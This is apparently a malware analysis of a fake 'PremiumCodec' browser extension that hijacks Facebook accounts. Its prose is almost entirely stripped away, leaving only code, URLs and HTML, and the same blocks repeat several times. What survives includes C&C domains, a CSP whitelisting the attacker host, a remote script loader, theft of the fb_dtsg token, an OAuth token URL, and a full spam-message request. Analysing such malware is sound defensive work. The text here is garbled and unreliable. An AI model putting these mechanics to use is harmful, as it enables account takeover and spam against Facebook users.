;message_batch[0][status]=0&amp;client=mercury&amp;__user=AAA&amp;__a=1&amp;__dyn=7n8anEAMCBynzpQ9UoGya4Cq74qbx2mbAKGiyGGEZ9LFDxCm6p_AyoSnx2&amp;__req=f&amp;fb_dtsg=100004008835111&amp;ttstamp=2658172571218810680459011989&amp;__rev=1300533</code> . <br> <br>    API <a href="https://facebook.com/">facebook.com</a> /ajax/mercury/send_messages.php?__a=1        ,     ,        . <br> <br> <img src="https://habrastorage.org/files/93e/683/f1f/93e683f1f6f84abb818f02c51f85869f.png"> <br> <i>   id      </i> <br> <br>    localStorage   okanxxxxss2     + 11e4,      <code>babasker()</code>   . <br> <br>  ,              Firefox.         ,          . <br> <br> <img src="https://habrastorage.org/files/1d0/e4c/734/1d0e4c7345764b4d9427d81e55c9da38.png"> <br> <br> ,            chrome.tabs.executeScript      CSP-,     //superfish.com, //ads.panoramtech.net  <a href="http://srv1.clk-analytics.com/">srv1.clk-analytics.com</a>      head  ,   CSP   .       ,        ,   CSP facebook.com.       ,         .       img-src  object-src,   facebook.com   CSP  . <br> <br>  <br>    Chrome,  ,             -  : <br> <br>          .                    ;            - ,    . <br> <br>         ,        , ..         ,     ,      -        . ,  ,    ,   ,   -   . <br> <br>  ,    ,   C&amp;C ,     , , adeaditi.info <br>  cracks4free.info. <br> <br>         : <br> <br> <a href="https://support.mozilla.org/ru/questions/959873">support.mozilla.org/ru/questions/959873</a> <br> <a href="http://stackoverflow.com/questions/17982902/prevent-malware-javascript-from-executing">stackoverflow.com/questions/17982902/prevent-malware-javascript-from-executing</a> <br> <br> ,            .          ,  ,     ,   2011 . <br> <br>     ,          - .      Facebook          .      ,               . <br> <br>           SBAPI  DNS,       .            ,    ,        ,      .   ,  CSP  ,  ,   img-src  object-src,  ,  ,           ,        .</code> <ul><li> <code><code><a href=""></a>  head .  kmain.js   -  ,      .      Facebook   ,  ,     adeaditi.info/kmain.js</code>       - .   ,    Firefox   Facebook-         . <br> <br> <img src="https://habrastorage.org/files/7ef/59f/f96/7ef59ff96d4e4707bb26f8f17e74b30b.png"> <br> <i>   PremiumCodec</i> <br> <br> <img src="https://habrastorage.org/files/744/13b/341/74413b3415754639b697abd7d4ac1587.png"> <br> <i>  <code><a href=""></a> adeaditi.info/kmain.js</code></i> <br> <br>    Chrome <br>         : icon128.png, manifest.json  main.js.     ,             YouTube,      "contextMenus"   permissions.  ,        : <br> <br> <code><a href=""></a> "content_security_policy": "script-src 'self' 'unsafe-eval' bmw5done.info; object-src 'self' 'unsafe-eval'"</code> , <br> <br>    ,     CSP    https       bmw5done.info. <br> <br>      main.js <br> <br> <img src="https://habrastorage.org/files/a61/53c/b85/a6153cb858714faa879b9159ed8f0722.png"> <br> <i>    main.js</i> <br> <br>  ,        document.write(‚Äúhttps://bmw5done.info/indonesia/ld.js‚Äù) . <br> <br>         ld.js,      <a href="http://pastebin.com/JB4kcaRk"></a> .      box,   ajax- : <br> <br> <code><a href=""></a> bmw5done.info/qbrweq.js?187630.24409614317</code> <br> <br>     json,          uri,      cmd.       json      ,  ,  cmd      . ,              . <br> <br>  ld.js    localStorage   ran_before, ,    ,      1,       facebook.com. <br> <br> <img src="https://habrastorage.org/files/c2d/c2b/a25/c2dc2ba25de04865a254ceae5854fd7d.png"> <br> <i>  ld.js</i> <br> <br>     callback-    .    ,     url    ‚Äúdevtools://‚Äù,   ,     ajax-   <code><a href=""></a> bmw5done.info/qbrweq.js?</code> ,             chrome.tabs.executeScript.  callback  ,    URL  : ‚Äúchrome://chrome/extensions‚Äù , ‚Äúopera://extensions‚Äù, ‚Äúchrome://extensions/‚Äù. <br> <br>        qbrweq.js?    ,     Facebook-,      <a href="http://pastebin.com/9jeC5sVi"></a> . <br> <br>   ,        URL ‚Äúwww.facebook.com‚Äù,   ,     .   ,       <code>uiToggle wrap, uiPopover. _5ce</code> .    ,   . ,            ,    Facebook  . <br> <br> <img src="https://habrastorage.org/files/214/a11/489/214a1148916843a2aaf214ced1ec78be.png"> <br> <i>  qbrweq.js,    </i> <br> <br>    ajax-    facebook.com,      document.cookie  ,     ANTI-CSRF- ‚Äúfb_dtsg‚Äù  uid .      ,    . <br> <br> <img src="https://habrastorage.org/files/3f6/248/da0/3f6248da017d4fc392ffa68e36708d90.png"> <br> <br>     URL <code><a href="https://bmw5done.info/apostime.php"></a> bmw5done.info/apostime.php</code> ‚Äî  php-   C&amp;C  .        ,    ,     json,       : link  type.  : <br> <br> <code>{ "link": "https://dl.dropbox.com/s/o2yzr7kfewaqc1o/sa7d89as987d78a9d89s_2_2_2.htm?1241705463", "type": "aktiv" }.</code> <br>     link,      ¬´?¬ª,      20   ,        ajax-     <code><a href="https://www.googleapis.com/urlshortener/v1/url"></a> www.googleapis.com/urlshortener/v1/url</code> .     localStorage   ‚Äúfb_postlink‚Äù.           . <br> <br>      ajax-api graph.facebook.com       .    <code><a href="https://facebook.com/ajax/typeahead/place_tag_friends.php"></a> facebook.com/ajax/typeahead/place_tag_friends.php</code>  json      .  json ,        friends_fields,      20  : <br> <br> <code>‚Äú&amp;composertags_with[19]=&lt;id_  &gt;"</code> . <br> <br> <img src="https://habrastorage.org/files/341/12b/bbd/34112bbbd66646cc9e550d28a8fe5711.png"> <br> <i>              20</i> <br> <br>      veri,          friends_fields. <br> <br>    ,     msjrandom.   json,   C&amp;C,   'aktiv'   1,   post_add().          ‚Äú  ‚Äù + ‚ÄúPrivate Video‚Äù     msjrandom,      "fb_postlink".  ,       (      veri).     . <br> <br>   ,      Like,       ,        . , ,       . <br> <br>      : <br> <br> <code>uygulamaizinver(TokenUrl("517220311745087"));</code> <br> <br>   ,            Facebook-  Facebook-  id 517220311745087.  TokenUrl()   url -: <br> <br> <code><a href="https://www.facebook.com/dialog/oauth%3Fresponse_type%3Dtoken%26display%3Dpopup%26client_id%3D517220311745087%26redirect_uri%3Dfbconnect"></a> www.facebook.com/dialog/oauth?response_type=token&amp;display=popup&amp;client_id=517220311745087&amp;redirect_uri=fbconnect://success&amp;sso_key=com&amp;scope=email,publish_stream,user_likes,friends_likes,user_birthday</code> <br> <br> <img src="https://habrastorage.org/files/0c2/a59/741/0c2a5974183d49d4890fe2571d9396cc.png"> <br> <br>  <code>uygulamaizinver()</code>   ajax-,       html,    ,     action  .       <code>duzenlevegonder()</code> ,            ,       ,  <code>duzenlevegonder()</code>  . <br> <br> <img src="https://habrastorage.org/files/08d/6d9/823/08d6d982394a45fb8cb3c528e0396b82.png"> <br> <br>       Facebook       ,    ,        .        .       . <br> <br>      ,     facebook.com,       ,     <code>babasker()</code> ,      <code><a href="https://bmw5done.info/ag.php"></a> bmw5done.info/ag.php</code> .    php-,     C&amp;C,   ,       API     Facebook.    json : <br> <br> <code>{ "link": "https://dl.dropbox.com/s/o2yzr7kfewaqc1o/sa7d89as987d78a9d89s_2_2_2.htm?1241705463", "base": "facebook.com", "okan": , "foto1": "https://graph.facebook.com/", "foto2": "/picture?type=large&amp;width=150&amp;height=150", "titulli": , "friends": "jo", "friendname": "jo", "type": "aktiv","web": "po" }</code> <br> <br>      ‚Äútype‚Äù   aktiv,   ajax-   <a href="https://www.googleapis.com/urlshortener/v1/">www.googleapis.com/urlshortener/v1</a>  ,    ,     C&amp;C   ‚Äúlink‚Äù,      localStorage     "fb_postlink", ,     .     <code>qwecek()</code> ,         C&amp;C json. <br> <br>    AJAX-API Facebook <a href="https://facebook.com/ajax/chat/buddy_list.php%3F__a%3D1">facebook.com/ajax/chat/buddy_list.php?__a=1</a> <br>   id ,     Facebook-,   configList.     20     id     .   c          json    <code>benimesaj()</code> ,       : <br> <br> <code>message_batch[0][action_type]=ma-type%3Auser-generated-message&amp;message_batch[0][author]=fbid%3A&lt;id__&gt;&amp;message_batch[0][author_email]&amp;message_batch[0][coordinates]&amp;message_batch[0][timestamp_time_passed]=0&amp;message_batch[0][is_unread]=false&amp;message_batch[0][is_cleared]=false&amp;message_batch[0][is_forward]=false&amp;message_batch[0][is_filtered_content]=false&amp;message_batch[0][is_spoof_warning]=false&amp;message_batch[0][source]=source%3Achat%3Aweb&amp;message_batch[0][source_tags][0]=source%3Achat&amp;message_batch[0][body]= &amp;message_batch[0][has_attachment]=true&amp;message_batch[0][html_body]=false&amp;&amp;message_batch[0][specific_to_list][0]=fbid%3A&lt;id__online&gt;&amp;message_batch[0][specific_to_list][1]=fbid%3A&lt;id__&gt;&amp;message_batch[0][content_attachment][subject]=IP6%20Short%20URL%20-%20Free%20service&amp;message_batch[0][content_attachment][app_id]=2309869772&amp;message_batch[0][content_attachment][attachment][params][urlInfo][canonical]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][urlInfo][final]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][urlInfo][user]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][favicon]=&amp;message_batch[0][content_attachment][attachment][params][title]=&lt;__online&gt;jo&amp;message_batch[0][content_attachment][attachment][params][summary]=youtube.com&amp;message_batch[0][content_attachment][attachment][params][images][0]=https://graph.facebook.com/&lt;id__online&gt;/picture?type=large&amp;width=150&amp;height=150&amp;message_batch[0][content_attachment][attachm...k_ <br> metrics][images_pending]=0&amp;message_batch[0][content_attachment][link_metrics][images_fetched]=0&amp;message_batch[0][content_attachment][link_metrics][image_dimensions][0]=626&amp;message_batch[0][content_attachment][link_metrics][image_dimensions][1]=293&amp;message_batch[0][content_attachment][link_metrics][images_selected]=1&amp;message_batch[0][content_attachment][link_metrics][images_considered]=1&amp;message_batch[0][content_attachment][link_metrics][images_cap]=3&amp;message_batch[0][content_attachment][link_metrics][images_type]=ranked&amp;message_batch[0][content_attachment][composer_metrics][best_image_w]=100&amp;message_batch[0][content_attachment][composer_metrics][best_image_h]=100&amp;message_batch[0][content_attachment][composer_metrics][image_selected]=0&amp;message_batch[0][content_attachment][composer_metrics][images_provided]=1&amp;message_batch[0][content_attachment][composer_metrics][images_loaded]=1&amp;message_batch[0][content_attachment][composer_metrics][images_shown]=1&amp;message_batch[0][content_attachment][composer_metrics][load_duration]=4&amp;message_batch[0][content_attachment][composer_metrics][timed_out]=0&amp;message_batch[0][content_attachment][composer_metrics][sort_order]=&amp;message_batch[0][content_attachment][composer_metrics][selector_type]=UIThumbPager_6&amp;message_batch[0][ui_push_phase]=V3&amp;message_batch[0][status]=0&amp;client=mercury&amp;__user=AAA&amp;__a=1&amp;__dyn=7n8anEAMCBynzpQ9UoGya4Cq74qbx2mbAKGiyGGEZ9LFDxCm6p_AyoSnx2&amp;__req=f&amp;fb_dtsg=100004008835111&amp;ttstamp=2658172571218810680459011989&amp;__rev=1300533</code> . <br> <br>    API <a href="https://facebook.com/">facebook.com</a> /ajax/mercury/send_messages.php?__a=1        ,     ,        . <br> <br> <img src="https://habrastorage.org/files/93e/683/f1f/93e683f1f6f84abb818f02c51f85869f.png"> <br> <i>   id      </i> <br> <br>    localStorage   okanxxxxss2     + 11e4,      <code>babasker()</code>   . <br> <br>  ,              Firefox.         ,          . <br> <br> <img src="https://habrastorage.org/files/1d0/e4c/734/1d0e4c7345764b4d9427d81e55c9da38.png"> <br> <br> ,            chrome.tabs.executeScript      CSP-,     //superfish.com, //ads.panoramtech.net  <a href="http://srv1.clk-analytics.com/">srv1.clk-analytics.com</a>      head  ,   CSP   .       ,        ,   CSP facebook.com.       ,         .       img-src  object-src,   facebook.com   CSP  . <br> <br>  <br>    Chrome,  ,             -  : <br> <br>          .                    ;            - ,    . <br> <br>         ,        , ..         ,     ,      -        . ,  ,    ,   ,   -   . <br> <br>  ,    ,   C&amp;C ,     , , adeaditi.info <br>  cracks4free.info. <br> <br>         : <br> <br> <a href="https://support.mozilla.org/ru/questions/959873">support.mozilla.org/ru/questions/959873</a> <br> <a href="http://stackoverflow.com/questions/17982902/prevent-malware-javascript-from-executing">stackoverflow.com/questions/17982902/prevent-malware-javascript-from-executing</a> <br> <br> ,            .          ,  ,     ,   2011 . <br> <br>     ,          - .      Facebook          .      ,               . <br> <br>           SBAPI  DNS,       .            ,    ,        ,      .   ,  CSP  ,  ,   img-src  object-src,  ,  ,           ,        .</code> </li> <li> <code><code><a href=""></a>  head .  kmain.js   -  ,      .      Facebook   ,  ,     adeaditi.info/kmain.js</code>       - .   ,    Firefox   Facebook-         . <br> <br> <img src="https://habrastorage.org/files/7ef/59f/f96/7ef59ff96d4e4707bb26f8f17e74b30b.png"> <br> <i>   PremiumCodec</i> <br> <br> <img src="https://habrastorage.org/files/744/13b/341/74413b3415754639b697abd7d4ac1587.png"> <br> <i>  <code><a href=""></a> adeaditi.info/kmain.js</code></i> <br> <br>    Chrome <br>         : icon128.png, manifest.json  main.js.     ,             YouTube,      "contextMenus"   permissions.  ,        : <br> <br> <code><a href=""></a> "content_security_policy": "script-src 'self' 'unsafe-eval' bmw5done.info; object-src 'self' 'unsafe-eval'"</code> , <br> <br>    ,     CSP    https       bmw5done.info. <br> <br>      main.js <br> <br> <img src="https://habrastorage.org/files/a61/53c/b85/a6153cb858714faa879b9159ed8f0722.png"> <br> <i>    main.js</i> <br> <br>  ,        document.write(‚Äúhttps://bmw5done.info/indonesia/ld.js‚Äù) . <br> <br>         ld.js,      <a href="http://pastebin.com/JB4kcaRk"></a> .      box,   ajax- : <br> <br> <code><a href=""></a> bmw5done.info/qbrweq.js?187630.24409614317</code> <br> <br>     json,          uri,      cmd.       json      ,  ,  cmd      . ,              . <br> <br>  ld.js    localStorage   ran_before, ,    ,      1,       facebook.com. <br> <br> <img src="https://habrastorage.org/files/c2d/c2b/a25/c2dc2ba25de04865a254ceae5854fd7d.png"> <br> <i>  ld.js</i> <br> <br>     callback-    .    ,     url    ‚Äúdevtools://‚Äù,   ,     ajax-   <code><a href=""></a> bmw5done.info/qbrweq.js?</code> ,             chrome.tabs.executeScript.  callback  ,    URL  : ‚Äúchrome://chrome/extensions‚Äù , ‚Äúopera://extensions‚Äù, ‚Äúchrome://extensions/‚Äù. <br> <br>        qbrweq.js?    ,     Facebook-,      <a href="http://pastebin.com/9jeC5sVi"></a> . <br> <br>   ,        URL ‚Äúwww.facebook.com‚Äù,   ,     .   ,       <code>uiToggle wrap, uiPopover. _5ce</code> .    ,   . ,            ,    Facebook  . <br> <br> <img src="https://habrastorage.org/files/214/a11/489/214a1148916843a2aaf214ced1ec78be.png"> <br> <i>  qbrweq.js,    </i> <br> <br>    ajax-    facebook.com,      document.cookie  ,     ANTI-CSRF- ‚Äúfb_dtsg‚Äù  uid .      ,    . <br> <br> <img src="https://habrastorage.org/files/3f6/248/da0/3f6248da017d4fc392ffa68e36708d90.png"> <br> <br>     URL <code><a href="https://bmw5done.info/apostime.php"></a> bmw5done.info/apostime.php</code> ‚Äî  php-   C&amp;C  .        ,    ,     json,       : link  type.  : <br> <br> <code>{ "link": "https://dl.dropbox.com/s/o2yzr7kfewaqc1o/sa7d89as987d78a9d89s_2_2_2.htm?1241705463", "type": "aktiv" }.</code> <br>     link,      ¬´?¬ª,      20   ,        ajax-     <code><a href="https://www.googleapis.com/urlshortener/v1/url"></a> www.googleapis.com/urlshortener/v1/url</code> .     localStorage   ‚Äúfb_postlink‚Äù.           . <br> <br>      ajax-api graph.facebook.com       .    <code><a href="https://facebook.com/ajax/typeahead/place_tag_friends.php"></a> facebook.com/ajax/typeahead/place_tag_friends.php</code>  json      .  json ,        friends_fields,      20  : <br> <br> <code>‚Äú&amp;composertags_with[19]=&lt;id_  &gt;"</code> . <br> <br> <img src="https://habrastorage.org/files/341/12b/bbd/34112bbbd66646cc9e550d28a8fe5711.png"> <br> <i>              20</i> <br> <br>      veri,          friends_fields. <br> <br>    ,     msjrandom.   json,   C&amp;C,   'aktiv'   1,   post_add().          ‚Äú  ‚Äù + ‚ÄúPrivate Video‚Äù     msjrandom,      "fb_postlink".  ,       (      veri).     . <br> <br>   ,      Like,       ,        . , ,       . <br> <br>      : <br> <br> <code>uygulamaizinver(TokenUrl("517220311745087"));</code> <br> <br>   ,            Facebook-  Facebook-  id 517220311745087.  TokenUrl()   url -: <br> <br> <code><a href="https://www.facebook.com/dialog/oauth%3Fresponse_type%3Dtoken%26display%3Dpopup%26client_id%3D517220311745087%26redirect_uri%3Dfbconnect"></a> www.facebook.com/dialog/oauth?response_type=token&amp;display=popup&amp;client_id=517220311745087&amp;redirect_uri=fbconnect://success&amp;sso_key=com&amp;scope=email,publish_stream,user_likes,friends_likes,user_birthday</code> <br> <br> <img src="https://habrastorage.org/files/0c2/a59/741/0c2a5974183d49d4890fe2571d9396cc.png"> <br> <br>  <code>uygulamaizinver()</code>   ajax-,       html,    ,     action  .       <code>duzenlevegonder()</code> ,            ,       ,  <code>duzenlevegonder()</code>  . <br> <br> <img src="https://habrastorage.org/files/08d/6d9/823/08d6d982394a45fb8cb3c528e0396b82.png"> <br> <br>       Facebook       ,    ,        .        .       . <br> <br>      ,     facebook.com,       ,     <code>babasker()</code> ,      <code><a href="https://bmw5done.info/ag.php"></a> bmw5done.info/ag.php</code> .    php-,     C&amp;C,   ,       API     Facebook.    json : <br> <br> <code>{ "link": "https://dl.dropbox.com/s/o2yzr7kfewaqc1o/sa7d89as987d78a9d89s_2_2_2.htm?1241705463", "base": "facebook.com", "okan": , "foto1": "https://graph.facebook.com/", "foto2": "/picture?type=large&amp;width=150&amp;height=150", "titulli": , "friends": "jo", "friendname": "jo", "type": "aktiv","web": "po" }</code> <br> <br>      ‚Äútype‚Äù   aktiv,   ajax-   <a href="https://www.googleapis.com/urlshortener/v1/">www.googleapis.com/urlshortener/v1</a>  ,    ,     C&amp;C   ‚Äúlink‚Äù,      localStorage     "fb_postlink", ,     .     <code>qwecek()</code> ,         C&amp;C json. <br> <br>    AJAX-API Facebook <a href="https://facebook.com/ajax/chat/buddy_list.php%3F__a%3D1">facebook.com/ajax/chat/buddy_list.php?__a=1</a> <br>   id ,     Facebook-,   configList.     20     id     .   c          json    <code>benimesaj()</code> ,       : <br> <br> <code>message_batch[0][action_type]=ma-type%3Auser-generated-message&amp;message_batch[0][author]=fbid%3A&lt;id__&gt;&amp;message_batch[0][author_email]&amp;message_batch[0][coordinates]&amp;message_batch[0][timestamp_time_passed]=0&amp;message_batch[0][is_unread]=false&amp;message_batch[0][is_cleared]=false&amp;message_batch[0][is_forward]=false&amp;message_batch[0][is_filtered_content]=false&amp;message_batch[0][is_spoof_warning]=false&amp;message_batch[0][source]=source%3Achat%3Aweb&amp;message_batch[0][source_tags][0]=source%3Achat&amp;message_batch[0][body]= &amp;message_batch[0][has_attachment]=true&amp;message_batch[0][html_body]=false&amp;&amp;message_batch[0][specific_to_list][0]=fbid%3A&lt;id__online&gt;&amp;message_batch[0][specific_to_list][1]=fbid%3A&lt;id__&gt;&amp;message_batch[0][content_attachment][subject]=IP6%20Short%20URL%20-%20Free%20service&amp;message_batch[0][content_attachment][app_id]=2309869772&amp;message_batch[0][content_attachment][attachment][params][urlInfo][canonical]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][urlInfo][final]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][urlInfo][user]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][favicon]=&amp;message_batch[0][content_attachment][attachment][params][title]=&lt;__online&gt;jo&amp;message_batch[0][content_attachment][attachment][params][summary]=youtube.com&amp;message_batch[0][content_attachment][attachment][params][images][0]=https://graph.facebook.com/&lt;id__online&gt;/picture?type=large&amp;width=150&amp;height=150&amp;message_batch[0][content_attachment][attachm...k_ <br> metrics][images_pending]=0&amp;message_batch[0][content_attachment][link_metrics][images_fetched]=0&amp;message_batch[0][content_attachment][link_metrics][image_dimensions][0]=626&amp;message_batch[0][content_attachment][link_metrics][image_dimensions][1]=293&amp;message_batch[0][content_attachment][link_metrics][images_selected]=1&amp;message_batch[0][content_attachment][link_metrics][images_considered]=1&amp;message_batch[0][content_attachment][link_metrics][images_cap]=3&amp;message_batch[0][content_attachment][link_metrics][images_type]=ranked&amp;message_batch[0][content_attachment][composer_metrics][best_image_w]=100&amp;message_batch[0][content_attachment][composer_metrics][best_image_h]=100&amp;message_batch[0][content_attachment][composer_metrics][image_selected]=0&amp;message_batch[0][content_attachment][composer_metrics][images_provided]=1&amp;message_batch[0][content_attachment][composer_metrics][images_loaded]=1&amp;message_batch[0][content_attachment][composer_metrics][images_shown]=1&amp;message_batch[0][content_attachment][composer_metrics][load_duration]=4&amp;message_batch[0][content_attachment][composer_metrics][timed_out]=0&amp;message_batch[0][content_attachment][composer_metrics][sort_order]=&amp;message_batch[0][content_attachment][composer_metrics][selector_type]=UIThumbPager_6&amp;message_batch[0][ui_push_phase]=V3&amp;message_batch[0][status]=0&amp;client=mercury&amp;__user=AAA&amp;__a=1&amp;__dyn=7n8anEAMCBynzpQ9UoGya4Cq74qbx2mbAKGiyGGEZ9LFDxCm6p_AyoSnx2&amp;__req=f&amp;fb_dtsg=100004008835111&amp;ttstamp=2658172571218810680459011989&amp;__rev=1300533</code> . <br> <br>    API <a href="https://facebook.com/">facebook.com</a> /ajax/mercury/send_messages.php?__a=1        ,     ,        . <br> <br> <img src="https://habrastorage.org/files/93e/683/f1f/93e683f1f6f84abb818f02c51f85869f.png"> <br> <i>   id      </i> <br> <br>    localStorage   okanxxxxss2     + 11e4,      <code>babasker()</code>   . <br> <br>  ,              Firefox.         ,          . <br> <br> <img src="https://habrastorage.org/files/1d0/e4c/734/1d0e4c7345764b4d9427d81e55c9da38.png"> <br> <br> ,            chrome.tabs.executeScript      CSP-,     //superfish.com, //ads.panoramtech.net  <a href="http://srv1.clk-analytics.com/">srv1.clk-analytics.com</a>      head  ,   CSP   .       ,        ,   CSP facebook.com.       ,         .       img-src  object-src,   facebook.com   CSP  . <br> <br>  <br>    Chrome,  ,             -  : <br> <br>          .                    ;            - ,    . <br> <br>         ,        , ..         ,     ,      -        . ,  ,    ,   ,   -   . <br> <br>  ,    ,   C&amp;C ,     , , adeaditi.info <br>  cracks4free.info. <br> <br>         : <br> <br> <a href="https://support.mozilla.org/ru/questions/959873">support.mozilla.org/ru/questions/959873</a> <br> <a href="http://stackoverflow.com/questions/17982902/prevent-malware-javascript-from-executing">stackoverflow.com/questions/17982902/prevent-malware-javascript-from-executing</a> <br> <br> ,            .          ,  ,     ,   2011 . <br> <br>     ,          - .      Facebook          .      ,               . <br> <br>           SBAPI  DNS,       .            ,    ,        ,      .   ,  CSP  ,  ,   img-src  object-src,  ,  ,           ,        .</code> </li> </ul> <code><code><a href=""></a>  head .  kmain.js   -  ,      .      Facebook   ,  ,     adeaditi.info/kmain.js</code>       - .   ,    Firefox   Facebook-         . <br> <br> <img src="https://habrastorage.org/files/7ef/59f/f96/7ef59ff96d4e4707bb26f8f17e74b30b.png"> <br> <i>   PremiumCodec</i> <br> <br> <img src="https://habrastorage.org/files/744/13b/341/74413b3415754639b697abd7d4ac1587.png"> <br> <i>  <code><a href=""></a> adeaditi.info/kmain.js</code></i> <br> <br>    Chrome <br>         : icon128.png, manifest.json  main.js.     ,             YouTube,      "contextMenus"   permissions.  ,        : <br> <br> <code><a href=""></a> "content_security_policy": "script-src 'self' 'unsafe-eval' bmw5done.info; object-src 'self' 'unsafe-eval'"</code> , <br> <br>    ,     CSP    https       bmw5done.info. <br> <br>      main.js <br> <br> <img src="https://habrastorage.org/files/a61/53c/b85/a6153cb858714faa879b9159ed8f0722.png"> <br> <i>    main.js</i> <br> <br>  ,        document.write(‚Äúhttps://bmw5done.info/indonesia/ld.js‚Äù) . <br> <br>         ld.js,      <a href="http://pastebin.com/JB4kcaRk"></a> .      box,   ajax- : <br> <br> <code><a href=""></a> bmw5done.info/qbrweq.js?187630.24409614317</code> <br> <br>     json,          uri,      cmd.       json      ,  ,  cmd      . ,              . <br> <br>  ld.js    localStorage   ran_before, ,    ,      1,       facebook.com. <br> <br> <img src="https://habrastorage.org/files/c2d/c2b/a25/c2dc2ba25de04865a254ceae5854fd7d.png"> <br> <i>  ld.js</i> <br> <br>     callback-    .    ,     url    ‚Äúdevtools://‚Äù,   ,     ajax-   <code><a href=""></a> bmw5done.info/qbrweq.js?</code> ,             chrome.tabs.executeScript.  callback  ,    URL  : ‚Äúchrome://chrome/extensions‚Äù , ‚Äúopera://extensions‚Äù, ‚Äúchrome://extensions/‚Äù. <br> <br>        qbrweq.js?    ,     Facebook-,      <a href="http://pastebin.com/9jeC5sVi"></a> . <br> <br>   ,        URL ‚Äúwww.facebook.com‚Äù,   ,     .   ,       <code>uiToggle wrap, uiPopover. _5ce</code> .    ,   . ,            ,    Facebook  . <br> <br> <img src="https://habrastorage.org/files/214/a11/489/214a1148916843a2aaf214ced1ec78be.png"> <br> <i>  qbrweq.js,    </i> <br> <br>    ajax-    facebook.com,      document.cookie  ,     ANTI-CSRF- ‚Äúfb_dtsg‚Äù  uid .      ,    . <br> <br> <img src="https://habrastorage.org/files/3f6/248/da0/3f6248da017d4fc392ffa68e36708d90.png"> <br> <br>     URL <code><a href="https://bmw5done.info/apostime.php"></a> bmw5done.info/apostime.php</code> ‚Äî  php-   C&amp;C  .        ,    ,     json,       : link  type.  : <br> <br> <code>{ "link": "https://dl.dropbox.com/s/o2yzr7kfewaqc1o/sa7d89as987d78a9d89s_2_2_2.htm?1241705463", "type": "aktiv" }.</code> <br>     link,      ¬´?¬ª,      20   ,        ajax-     <code><a href="https://www.googleapis.com/urlshortener/v1/url"></a> www.googleapis.com/urlshortener/v1/url</code> .     localStorage   ‚Äúfb_postlink‚Äù.           . <br> <br>      ajax-api graph.facebook.com       .    <code><a href="https://facebook.com/ajax/typeahead/place_tag_friends.php"></a> facebook.com/ajax/typeahead/place_tag_friends.php</code>  json      .  json ,        friends_fields,      20  : <br> <br> <code>‚Äú&amp;composertags_with[19]=&lt;id_  &gt;"</code> . <br> <br> <img src="https://habrastorage.org/files/341/12b/bbd/34112bbbd66646cc9e550d28a8fe5711.png"> <br> <i>              20</i> <br> <br>      veri,          friends_fields. <br> <br>    ,     msjrandom.   json,   C&amp;C,   'aktiv'   1,   post_add().          ‚Äú  ‚Äù + ‚ÄúPrivate Video‚Äù     msjrandom,      "fb_postlink".  ,       (      veri).     . <br> <br>   ,      Like,       ,        . , ,       . <br> <br>      : <br> <br> <code>uygulamaizinver(TokenUrl("517220311745087"));</code> <br> <br>   ,            Facebook-  Facebook-  id 517220311745087.  TokenUrl()   url -: <br> <br> <code><a href="https://www.facebook.com/dialog/oauth%3Fresponse_type%3Dtoken%26display%3Dpopup%26client_id%3D517220311745087%26redirect_uri%3Dfbconnect"></a> www.facebook.com/dialog/oauth?response_type=token&amp;display=popup&amp;client_id=517220311745087&amp;redirect_uri=fbconnect://success&amp;sso_key=com&amp;scope=email,publish_stream,user_likes,friends_likes,user_birthday</code> <br> <br> <img src="https://habrastorage.org/files/0c2/a59/741/0c2a5974183d49d4890fe2571d9396cc.png"> <br> <br>  <code>uygulamaizinver()</code>   ajax-,       html,    ,     action  .       <code>duzenlevegonder()</code> ,            ,       ,  <code>duzenlevegonder()</code>  . <br> <br> <img src="https://habrastorage.org/files/08d/6d9/823/08d6d982394a45fb8cb3c528e0396b82.png"> <br> <br>       Facebook       ,    ,        .        .       . <br> <br>      ,     facebook.com,       ,     <code>babasker()</code> ,      <code><a href="https://bmw5done.info/ag.php"></a> bmw5done.info/ag.php</code> .    php-,     C&amp;C,   ,       API     Facebook.    json : <br> <br> <code>{ "link": "https://dl.dropbox.com/s/o2yzr7kfewaqc1o/sa7d89as987d78a9d89s_2_2_2.htm?1241705463", "base": "facebook.com", "okan": , "foto1": "https://graph.facebook.com/", "foto2": "/picture?type=large&amp;width=150&amp;height=150", "titulli": , "friends": "jo", "friendname": "jo", "type": "aktiv","web": "po" }</code> <br> <br>      ‚Äútype‚Äù   aktiv,   ajax-   <a href="https://www.googleapis.com/urlshortener/v1/">www.googleapis.com/urlshortener/v1</a>  ,    ,     C&amp;C   ‚Äúlink‚Äù,      localStorage     "fb_postlink", ,     .     <code>qwecek()</code> ,         C&amp;C json. <br> <br>    AJAX-API Facebook <a href="https://facebook.com/ajax/chat/buddy_list.php%3F__a%3D1">facebook.com/ajax/chat/buddy_list.php?__a=1</a> <br>   id ,     Facebook-,   configList.     20     id     .   c          json    <code>benimesaj()</code> ,       : <br> <br> <code>message_batch[0][action_type]=ma-type%3Auser-generated-message&amp;message_batch[0][author]=fbid%3A&lt;id__&gt;&amp;message_batch[0][author_email]&amp;message_batch[0][coordinates]&amp;message_batch[0][timestamp_time_passed]=0&amp;message_batch[0][is_unread]=false&amp;message_batch[0][is_cleared]=false&amp;message_batch[0][is_forward]=false&amp;message_batch[0][is_filtered_content]=false&amp;message_batch[0][is_spoof_warning]=false&amp;message_batch[0][source]=source%3Achat%3Aweb&amp;message_batch[0][source_tags][0]=source%3Achat&amp;message_batch[0][body]= &amp;message_batch[0][has_attachment]=true&amp;message_batch[0][html_body]=false&amp;&amp;message_batch[0][specific_to_list][0]=fbid%3A&lt;id__online&gt;&amp;message_batch[0][specific_to_list][1]=fbid%3A&lt;id__&gt;&amp;message_batch[0][content_attachment][subject]=IP6%20Short%20URL%20-%20Free%20service&amp;message_batch[0][content_attachment][app_id]=2309869772&amp;message_batch[0][content_attachment][attachment][params][urlInfo][canonical]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][urlInfo][final]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][urlInfo][user]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][favicon]=&amp;message_batch[0][content_attachment][attachment][params][title]=&lt;__online&gt;jo&amp;message_batch[0][content_attachment][attachment][params][summary]=youtube.com&amp;message_batch[0][content_attachment][attachment][params][images][0]=https://graph.facebook.com/&lt;